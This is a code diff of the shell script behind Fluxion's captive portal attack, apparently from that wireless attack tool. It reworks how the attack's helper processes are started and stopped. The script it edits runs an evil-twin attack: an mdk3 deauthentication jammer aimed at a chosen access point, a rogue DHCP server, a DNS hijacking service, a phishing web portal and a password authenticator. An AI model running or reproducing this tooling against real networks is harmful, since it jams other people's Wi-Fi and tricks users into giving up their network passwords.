@@ -968,29 +968,34 @@ function stop_attack() {
 	# Signal any authenticator to stop authentication loop.
 	if [ "$authenticatorPID" ]; then kill -s SIGABRT $authenticatorPID; fi
 
-	killall mdk3 &> $FLUXIONOutputDevice
-	local FLUXIONJammer=$(ps a | grep -e "FLUXION AP Jammer" | awk '{print $1'})
-	if [ "$FLUXIONJammer" ]
-		then kill $FLUXIONJammer &> $FLUXIONOutputDevice
+	if [ "$CaptivePortalJammerServiceXtermPID" ]; then
+		kill $(pgrep -P $CaptivePortalJammerServiceXtermPID 2> $FLUXIONOutputDevice) &> $FLUXIONOutputDevice
+		CaptivePortalJammerServiceXtermPID="" # Clear parent PID
 	fi
 	sandbox_remove_workfile "$FLUXIONWorkspacePath/mdk3_blacklist.lst"
 
+	# Kill captive portal web server log viewer.
+	if [ "$CaptivePortalWebServiceXtermPID" ]; then
+		kill $CaptivePortalWebServiceXtermPID &> $FLUXIONOutputDevice
+		CaptivePortalWebServiceXtermPID="" # Clear service PID
+	fi
+
 	# Kill captive portal web server.
-	if [ $CaptivePortalServerPID ]; then
-		kill $CaptivePortalServerPID &> $FLUXIONOutputDevice
-		CaptivePortalServerPID=""
+	if [ "$CaptivePortalWebServicePID" ]; then
+		kill $CaptivePortalWebServicePID &> $FLUXIONOutputDevice
+		CaptivePortalWebServicePID="" # Clear service PID
 	fi
 
 	# Kill python DNS service if one is found.
-	local FLUXIONDNS=$(ps a | grep -e "FLUXION AP DNS" | awk '{print $1'})
-	if [ "$FLUXIONDNS" ]
-		then kill $FLUXIONDNS &> $FLUXIONOutputDevice
+	if [ "$CaptivePortalDNSServiceXtermPID" ]; then
+		kill $(pgrep -P $CaptivePortalDNSServiceXtermPID 2> $FLUXIONOutputDevice) &> $FLUXIONOutputDevice
+		CaptivePortalDNSServiceXtermPID="" # Clear parent PID
 	fi
 
 	# Kill DHCP service.
-	local FLUXIONDHCP=$(ps a | grep -e "FLUXION AP DHCP" | awk '{print $1'})
-	if [ "$FLUXIONDHCP" ]
-		then kill $FLUXIONDHCP &> $FLUXIONOutputDevice
+	if [ "$CaptivePortalDHCPServiceXtermPID" ]; then
+		kill $(pgrep -P $CaptivePortalDHCPServiceXtermPID 2> $FLUXIONOutputDevice) &> $FLUXIONOutputDevice
+		CaptivePortalDHCPServiceXtermPID="" # Clear parent PID
 	fi
 	sandbox_remove_workfile "$FLUXIONWorkspacePath/clients.txt"
 
@@ -1009,21 +1014,27 @@ function start_attack() {
 	captive_portal_start_interface
 
 	echo -e "$FLUXIONVLine $CaptivePortalStartingDHCPServiceNotice"
-	xterm -bg black -fg green $TOPLEFT -title "FLUXION AP DHCP Service" -e "dhcpd -d -f -lf \"$FLUXIONWorkspacePath/dhcpd.leases\" -cf \"$FLUXIONWorkspacePath/dhcpd.conf\" $VIGW 2>&1 | tee -a \"$FLUXIONWorkspacePath/clients.txt\"" &
+	xterm $FLUXIONHoldXterm $TOPLEFT -bg black -fg "#CCCC00" -title "FLUXION AP DHCP Service" -e "dhcpd -d -f -lf \"$FLUXIONWorkspacePath/dhcpd.leases\" -cf \"$FLUXIONWorkspacePath/dhcpd.conf\" $VIGW 2>&1 | tee -a \"$FLUXIONWorkspacePath/clients.txt\"" &
+	CaptivePortalDHCPServiceXtermPID=$! # Save parent's pid, to get to child later.
 
 	echo -e "$FLUXIONVLine $CaptivePortalStartingDNSServiceNotice"
-    xterm $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "FLUXION AP DNS Service" -e "if type python2 >/dev/null 2>/dev/null; then python2 \"$FLUXIONWorkspacePath/fluxion_captive_portal_dns.py\"; else python \"$FLUXIONWorkspacePath/fluxion_captive_portal_dns.py\"; fi" &
+    xterm $FLUXIONHoldXterm $BOTTOMLEFT -bg black -fg "#99CCFF" -title "FLUXION AP DNS Service" -e "if type python2 >/dev/null 2>/dev/null; then python2 \"$FLUXIONWorkspacePath/fluxion_captive_portal_dns.py\"; else python \"$FLUXIONWorkspacePath/fluxion_captive_portal_dns.py\"; fi" &
+	CaptivePortalDNSServiceXtermPID=$! # Save parent's pid, to get to child later.
 
 	echo -e "$FLUXIONVLine $CaptivePortalStartingWebServiceNotice"
     lighttpd -f "$FLUXIONWorkspacePath/lighttpd.conf" &> $FLUXIONOutputDevice
-	CaptivePortalServerPID=$!
+	CaptivePortalWebServicePID=$!
+
+	xterm $FLUXIONHoldXterm $BOTTOM -bg black -fg "#00CC00" -title "FLUXION Web Service" -e "tail -f \"$FLUXIONWorkspacePath/lighttpd.log\"" &
+	CaptivePortalWebServiceXtermPID=$!
 
 	echo -e "$FLUXIONVLine $CaptivePortalStartingJammerServiceNotice"
     echo -e "$APTargetMAC" > "$FLUXIONWorkspacePath/mdk3_blacklist.lst"
-    xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "FLUXION AP Jammer [mdk3]  $APTargetSSID" -e "mdk3 $WIMonitor d -c $APTargetChannel -b \"$FLUXIONWorkspacePath/mdk3_blacklist.lst\"" &
+    xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" -title "FLUXION AP Jammer Service [$APTargetSSID]" -e "mdk3 $WIMonitor d -c $APTargetChannel -b \"$FLUXIONWorkspacePath/mdk3_blacklist.lst\"" &
+	CaptivePortalJammerServiceXtermPID=$! # Save parent's pid, to get to child later.
 
 	echo -e "$FLUXIONVLine $CaptivePortalStartingAuthenticatorServiceNotice"
-    xterm -hold $TOPRIGHT -bg "#000000" -fg "#CCCCCC" -title "FLUXION AP Authenticator" -e "$FLUXIONWorkspacePath/captive_portal_authenticator.sh" &
+    xterm -hold $TOPRIGHT -bg black -fg "#CCCCCC" -title "FLUXION AP Authenticator" -e "$FLUXIONWorkspacePath/captive_portal_authenticator.sh" &
 }
 
 # FLUXSCRIPT END
